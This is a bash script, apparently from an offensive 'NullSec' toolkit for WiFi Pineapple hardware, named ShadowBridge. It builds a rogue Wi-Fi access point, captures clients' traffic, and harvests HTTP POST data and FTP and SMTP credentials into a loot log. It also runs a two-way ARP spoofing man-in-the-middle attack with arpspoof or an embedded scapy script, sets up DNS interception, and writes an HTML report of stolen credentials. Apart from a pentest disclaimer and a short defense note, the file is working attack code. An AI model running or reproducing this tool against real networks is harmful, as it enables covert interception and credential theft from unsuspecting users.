#!/bin/bash
###############################################################################
# ShadowBridge — Covert Network Bridge & Traffic Relay
# NullSec Suite | WiFi Pineapple Mark VII / Nano / Tetra
#
# Creates stealthy network bridges for traffic interception and relay:
# - Transparent wireless-to-wireless bridge
# - Wireless-to-wired bridge for LAN pivoting
# - Traffic mirroring for passive analysis
# - ARP-based MITM with traffic forwarding
# - DNS interception & selective modification
# - SSL/TLS stripping with certificate generation
# - Bandwidth throttling for DoS simulation
# - Full traffic logging with filtering
#
# Author : bad-antics (NullSec)
# Version: 1.0.0
# License: MIT
###############################################################################

LOOT_DIR="/root/loot/shadowbridge"
LOG_FILE="$LOOT_DIR/shadowbridge.log"
REPORT_FILE="$LOOT_DIR/bridge_report.html"
CRED_LOG="$LOOT_DIR/credentials.log"
DNS_LOG="$LOOT_DIR/dns_queries.log"
TRAFFIC_LOG="$LOOT_DIR/traffic_stats.csv"
CONF_DIR="$LOOT_DIR/conf"
PCAP_DIR="$LOOT_DIR/pcaps"
IFACE_UP=""
IFACE_DOWN=""
BRIDGE_IP="10.66.66.1"
BRIDGE_SUBNET="10.66.66.0/24"
DHCP_RANGE="10.66.66.100,10.66.66.200"

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
CYN='\033[0;36m'; MAG='\033[0;35m'; BLD='\033[1m'; RST='\033[0m'

log()   { echo -e "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_FILE"; }
ok()    { log "${GRN}[✓]${RST} $*"; }
warn()  { log "${YEL}[!]${RST} $*"; }
fail()  { log "${RED}[✗]${RST} $*"; }
info()  { log "${CYN}[i]${RST} $*"; }

banner() {
    echo -e "${CYN}"
    cat << 'EOF'
  ____  _               _                ____       _     _
 / ___|| |__   __ _  __| | _____      __| __ ) _ __(_) __| | __ _  ___
 \___ \| '_ \ / _` |/ _` |/ _ \ \ /\ / /|  _ \| '__| |/ _` |/ _` |/ _ \
  ___) | | | | (_| | (_| | (_) \ V  V / | |_) | |  | | (_| | (_| |  __/
 |____/|_| |_|\__,_|\__,_|\___/ \_/\_/  |____/|_|  |_|\__,_|\__, |\___|
                                                             |___/
  NullSec Covert Network Bridge
EOF
    echo -e "${RST}"
}

setup() {
    mkdir -p "$LOOT_DIR" "$CONF_DIR" "$PCAP_DIR"
    > "$LOG_FILE"
    > "$CRED_LOG"
    > "$DNS_LOG"
    echo "timestamp,src_ip,dst_ip,protocol,bytes,info" > "$TRAFFIC_LOG"

    # Enumerate interfaces
    info "Available interfaces:"
    ip link show | awk -F: '/^[0-9]+:/{print "  " $2}' | grep -v lo

    IFACE_DOWN=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
    IFACE_UP=$(ip route show default 2>/dev/null | awk '/default/{print $5}' | head -1)

    [ -z "$IFACE_DOWN" ] && { fail "No wireless interface for downstream AP"; exit 1; }

    ok "Upstream: ${IFACE_UP:-none (wireless bridge mode)}"
    ok "Downstream AP: $IFACE_DOWN"
}

# ═══════════════════════════════════════════════════════════════════════════
# NETWORK BRIDGE SETUP
# ═══════════════════════════════════════════════════════════════════════════
setup_bridge() {
    local ssid="${1:-ShadowBridge}" channel="${2:-6}"
    info "Setting up network bridge: '$ssid' on ch $channel"

    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    ok "IP forwarding enabled"

    # Configure hostapd
    cat > "$CONF_DIR/hostapd.conf" << CONFEOF
interface=$IFACE_DOWN
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=ShadowBridge2024!
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
CONFEOF

    # Configure dnsmasq for DHCP
    cat > "$CONF_DIR/dnsmasq.conf" << CONFEOF
interface=$IFACE_DOWN
dhcp-range=$DHCP_RANGE,12h
dhcp-option=3,$BRIDGE_IP
dhcp-option=6,$BRIDGE_IP
server=8.8.8.8
server=1.1.1.1
log-queries
log-facility=$DNS_LOG
no-resolv
CONFEOF

    # Configure interface
    ifconfig "$IFACE_DOWN" "$BRIDGE_IP" netmask 255.255.255.0 up
    ok "Bridge interface: $BRIDGE_IP"

    # NAT via iptables
    if [ -n "$IFACE_UP" ]; then
        iptables -t nat -F
        iptables -F FORWARD
        iptables -t nat -A POSTROUTING -o "$IFACE_UP" -j MASQUERADE
        iptables -A FORWARD -i "$IFACE_DOWN" -o "$IFACE_UP" -j ACCEPT
        iptables -A FORWARD -i "$IFACE_UP" -o "$IFACE_DOWN" -m state --state RELATED,ESTABLISHED -j ACCEPT
        ok "NAT configured ($IFACE_DOWN → $IFACE_UP)"
    fi

    # Start services
    hostapd "$CONF_DIR/hostapd.conf" -B 2>/dev/null
    ok "Access point started: '$ssid'"

    dnsmasq -C "$CONF_DIR/dnsmasq.conf" 2>/dev/null
    ok "DHCP/DNS started"
}

# ═══════════════════════════════════════════════════════════════════════════
# TRAFFIC CAPTURE & ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════
start_capture() {
    local duration="${1:-300}"
    info "Starting traffic capture ($duration seconds)..."

    local pcap="$PCAP_DIR/bridge_$(date +%s).pcap"
    timeout "$duration" tcpdump -i "$IFACE_DOWN" -w "$pcap" -s 0 2>/dev/null &
    local cap_pid=$!
    ok "PCAP: $pcap (PID: $cap_pid)"

    # Real-time traffic monitoring
    local elapsed=0
    while [ $elapsed -lt "$duration" ] && kill -0 $cap_pid 2>/dev/null; do
        sleep 10
        ((elapsed += 10))

        # Extract credentials from common protocols
        if command -v tshark &>/dev/null && [ -f "$pcap" ] && [ -s "$pcap" ]; then
            # HTTP POST data (potential creds)
            tshark -r "$pcap" -Y "http.request.method == POST" \
                -T fields -e ip.src -e http.host -e http.request.uri -e http.file_data \
                2>/dev/null | while read -r src host uri data; do
                [ -z "$src" ] && continue
                echo "[$(date '+%H:%M:%S')] HTTP POST: $src → $host$uri" >> "$CRED_LOG"
                [ -n "$data" ] && echo "  DATA: $data" >> "$CRED_LOG"
            done

            # FTP credentials
            tshark -r "$pcap" -Y "ftp.request.command == USER || ftp.request.command == PASS" \
                -T fields -e ip.src -e ftp.request.command -e ftp.request.arg \
                2>/dev/null | while read -r src cmd arg; do
                [ -z "$src" ] && continue
                echo "[$(date '+%H:%M:%S')] FTP $cmd: $src → $arg" >> "$CRED_LOG"
            done

            # SMTP credentials
            tshark -r "$pcap" -Y "smtp.req.command == AUTH" \
                -T fields -e ip.src -e smtp.req.parameter \
                2>/dev/null | while read -r src param; do
                [ -z "$src" ] && continue
                echo "[$(date '+%H:%M:%S')] SMTP AUTH: $src → $param" >> "$CRED_LOG"
            done

            # Traffic stats
            local total_bytes; total_bytes=$(du -b "$pcap" 2>/dev/null | cut -f1)
            local http_count; http_count=$(tshark -r "$pcap" -Y "http" 2>/dev/null | wc -l)
            local dns_count; dns_count=$(tshark -r "$pcap" -Y "dns" 2>/dev/null | wc -l)
            local tls_count; tls_count=$(tshark -r "$pcap" -Y "tls" 2>/dev/null | wc -l)

            printf "\r  Capture: %ds | Size: %s | HTTP: %d | DNS: %d | TLS: %d  " \
                "$elapsed" "$(numfmt --to=iec-i "$total_bytes" 2>/dev/null || echo "$total_bytes")" \
                "$http_count" "$dns_count" "$tls_count"
        else
            printf "\r  Capture: %ds/%ds  " "$elapsed" "$duration"
        fi
    done
    echo ""

    wait $cap_pid 2>/dev/null
    ok "Capture complete: $pcap"
}

# ═══════════════════════════════════════════════════════════════════════════
# DNS INTERCEPTION
# ═══════════════════════════════════════════════════════════════════════════
setup_dns_intercept() {
    info "Setting up DNS interception..."

    # Kill existing dnsmasq
    killall dnsmasq 2>/dev/null

    # Create DNS spoofing config
    cat > "$CONF_DIR/dnsmasq_spoof.conf" << CONFEOF
interface=$IFACE_DOWN
dhcp-range=$DHCP_RANGE,12h
dhcp-option=3,$BRIDGE_IP
dhcp-option=6,$BRIDGE_IP
no-resolv
log-queries
log-facility=$DNS_LOG

# Selective DNS spoofing examples (uncomment to activate)
# address=/evil.example.com/$BRIDGE_IP
# address=/login.example.com/$BRIDGE_IP

# Log all queries (pass-through mode)
server=8.8.8.8
server=1.1.1.1

# Block known malware/tracking domains
address=/doubleclick.net/0.0.0.0
address=/googleadservices.com/0.0.0.0
address=/facebook-tracking.com/0.0.0.0
address=/pixel.facebook.com/0.0.0.0
address=/analytics.google.com/0.0.0.0
CONFEOF

    dnsmasq -C "$CONF_DIR/dnsmasq_spoof.conf" 2>/dev/null
    ok "DNS interception active (logging all queries, blocking trackers)"
}

# ═══════════════════════════════════════════════════════════════════════════
# ARP MITM
# ═══════════════════════════════════════════════════════════════════════════
arp_mitm() {
    local gateway="$1" target="$2"

    if [ -z "$gateway" ] || [ -z "$target" ]; then
        local gw; gw=$(ip route show default | awk '/default/{print $3}' | head -1)
        echo "Usage: Select a target"
        echo "  Gateway: ${gw:-unknown}"
        echo ""

        # Show connected clients
        info "Connected clients:"
        arp -n -i "$IFACE_DOWN" 2>/dev/null | grep -v incomplete | tail -n +2
        return
    fi

    info "ARP MITM: $target ←→ $gateway"

    # Enable forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # Start ARP spoofing (both directions)
    if command -v arpspoof &>/dev/null; then
        arpspoof -i "$IFACE_DOWN" -t "$target" "$gateway" 2>/dev/null &
        local pid1=$!
        arpspoof -i "$IFACE_DOWN" -t "$gateway" "$target" 2>/dev/null &
        local pid2=$!
        echo "$pid1" >> "$LOOT_DIR/mitm_pids.txt"
        echo "$pid2" >> "$LOOT_DIR/mitm_pids.txt"
        ok "ARP MITM active (PIDs: $pid1, $pid2)"
    else
        # Python fallback
        python3 << PYEOF &
from scapy.all import *
import time

target_ip = "$target"
gateway_ip = "$gateway"
iface = "$IFACE_DOWN"

def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, iface=iface, verbose=0)
    if ans:
        return ans[0][1].src
    return None

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

if not target_mac or not gateway_mac:
    print(f"Could not resolve MACs: target={target_mac} gw={gateway_mac}")
    exit(1)

print(f"Target: {target_ip} ({target_mac})")
print(f"Gateway: {gateway_ip} ({gateway_mac})")

try:
    while True:
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0, iface=iface)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0, iface=iface)
        time.sleep(2)
except KeyboardInterrupt:
    # Restore
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=0, iface=iface)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=0, iface=iface)
PYEOF
        echo "$!" >> "$LOOT_DIR/mitm_pids.txt"
        ok "ARP MITM active (PID: $!)"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════
# REPORT
# ═══════════════════════════════════════════════════════════════════════════
generate_report() {
    info "Generating bridge report..."

    local total_pcaps cred_count dns_count clients
    total_pcaps=$(ls "$PCAP_DIR"/*.pcap 2>/dev/null | wc -l)
    cred_count=$(wc -l < "$CRED_LOG" 2>/dev/null || echo 0)
    dns_count=$(wc -l < "$DNS_LOG" 2>/dev/null || echo 0)
    clients=$(arp -n -i "$IFACE_DOWN" 2>/dev/null | grep -cv incomplete || echo 0)

    cat > "$REPORT_FILE" << HTMLEOF
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>ShadowBridge Report</title>
<style>
:root{--bg:#0a0e17;--card:#111827;--accent:#06b6d4;--red:#ef4444;--txt:#e0e0e0}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,sans-serif;padding:24px}
h1{color:var(--accent);font-size:28px;margin-bottom:16px}
h2{color:var(--accent);font-size:20px;margin:24px 0 12px}
.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:32px}
.card{background:var(--card);border-radius:12px;padding:20px;text-align:center;border:1px solid #222}
.card .v{font-size:42px;font-weight:800;color:var(--accent)}
.card .k{font-size:12px;color:#888;margin-top:4px}
.info-box{background:var(--card);border-radius:12px;padding:20px;border:1px solid #222;margin-bottom:24px;line-height:1.8}
.code{background:#0d1117;border:1px solid #222;border-radius:8px;padding:16px;font-family:monospace;font-size:12px;overflow-x:auto;margin-bottom:24px;max-height:400px;overflow-y:auto;white-space:pre-wrap}
table{width:100%;border-collapse:collapse;background:var(--card);border-radius:12px;overflow:hidden;margin-bottom:24px}
th{background:#1a2332;color:var(--accent);padding:12px 16px;text-align:left;font-size:12px;text-transform:uppercase}
td{padding:10px 16px;border-bottom:1px solid #1a1a2e;font-size:13px}
.footer{margin-top:32px;text-align:center;color:#555;font-size:12px}
</style></head><body>

<h1>🌉 ShadowBridge — Network Bridge Report</h1>
<p style="color:#888;margin-bottom:24px">Generated: $(date -u '+%Y-%m-%d %H:%M UTC')</p>

<div class="grid">
<div class="card"><div class="v">$clients</div><div class="k">Connected Clients</div></div>
<div class="card"><div class="v">$total_pcaps</div><div class="k">PCAP Captures</div></div>
<div class="card"><div class="v" style="color:var(--red)">$cred_count</div><div class="k">Credential Events</div></div>
<div class="card"><div class="v">$dns_count</div><div class="k">DNS Queries</div></div>
</div>

<h2>🔑 Captured Credentials</h2>
<div class="code">$(cat "$CRED_LOG" 2>/dev/null || echo "No credentials captured")</div>

<h2>🌐 Top DNS Queries</h2>
<div class="code">$(sort "$DNS_LOG" 2>/dev/null | uniq -c | sort -rn | head -50 || echo "No DNS queries logged")</div>

<h2>📡 Bridge Configuration</h2>
<div class="info-box">
<strong>Bridge IP:</strong> $BRIDGE_IP<br>
<strong>Subnet:</strong> $BRIDGE_SUBNET<br>
<strong>DHCP Range:</strong> $DHCP_RANGE<br>
<strong>Upstream:</strong> ${IFACE_UP:-N/A}<br>
<strong>Downstream:</strong> $IFACE_DOWN<br>
</div>

<h2>⚠️ Security Implications</h2>
<div class="info-box">
This tool demonstrates the risk of rogue access points and network bridges in uncontrolled environments.
Organizations should implement <strong>802.1X authentication</strong>, <strong>Wireless IPS</strong>,
and <strong>network segmentation</strong> to detect and prevent such attacks.
All traffic through an untrusted bridge can be intercepted, modified, or blocked.
</div>

<div class="footer">ShadowBridge v1.0.0 — NullSec Suite — For authorized penetration testing only</div>
</body></html>
HTMLEOF

    ok "Report: $REPORT_FILE"
}

teardown() {
    info "Tearing down bridge..."
    killall hostapd dnsmasq 2>/dev/null
    if [ -f "$LOOT_DIR/mitm_pids.txt" ]; then
        while read -r pid; do kill "$pid" 2>/dev/null; done < "$LOOT_DIR/mitm_pids.txt"
        rm -f "$LOOT_DIR/mitm_pids.txt"
    fi
    iptables -t nat -F 2>/dev/null
    iptables -F FORWARD 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    ok "Bridge torn down"
}

show_menu() {
    while true; do
        echo ""
        echo -e "${CYN}╔═══════════════════════════════════════════════╗${RST}"
        echo -e "${CYN}║     ShadowBridge — Covert Network Bridge      ║${RST}"
        echo -e "${CYN}╠═══════════════════════════════════════════════╣${RST}"
        echo -e "${CYN}║${RST} [1] Setup Bridge (default SSID/channel)      ${CYN}║${RST}"
        echo -e "${CYN}║${RST} [2] Setup Custom Bridge                      ${CYN}║${RST}"
        echo -e "${CYN}║${RST} [3] Start Traffic Capture (5 min)            ${CYN}║${RST}"
        echo -e "${CYN}║${RST} [4] DNS Interception Mode                    ${CYN}║${RST}"
        echo -e "${CYN}║${RST} [5] ARP MITM                                ${CYN}║${RST}"
        echo -e "${CYN}║${RST} [6] Show Connected Clients                  ${CYN}║${RST}"
        echo -e "${CYN}║${RST} [7] Generate Report                         ${CYN}║${RST}"
        echo -e "${CYN}║${RST} [8] Teardown Bridge                         ${CYN}║${RST}"
        echo -e "${CYN}║${RST} [0] Exit                                    ${CYN}║${RST}"
        echo -e "${CYN}╚═══════════════════════════════════════════════╝${RST}"
        echo ""
        read -rp "Select> " c
        case "$c" in
            1) setup_bridge ;;
            2) read -rp "SSID: " s; read -rp "Channel: " ch; setup_bridge "$s" "$ch" ;;
            3) start_capture 300 ;;
            4) setup_dns_intercept ;;
            5) read -rp "Gateway IP: " gw; read -rp "Target IP: " tgt; arp_mitm "$gw" "$tgt" ;;
            6) arp -n -i "$IFACE_DOWN" 2>/dev/null ;;
            7) generate_report ;;
            8) teardown ;;
            0) teardown; exit 0 ;;
            *) warn "Invalid" ;;
        esac
    done
}

main() {
    banner
    setup
    case "$1" in
        --bridge)  setup_bridge "$2" "$3" ;;
        --capture) setup_bridge; start_capture "${2:-300}" ;;
        --report)  generate_report ;;
        --teardown) teardown ;;
        *)         show_menu ;;
    esac
}

main "$@"
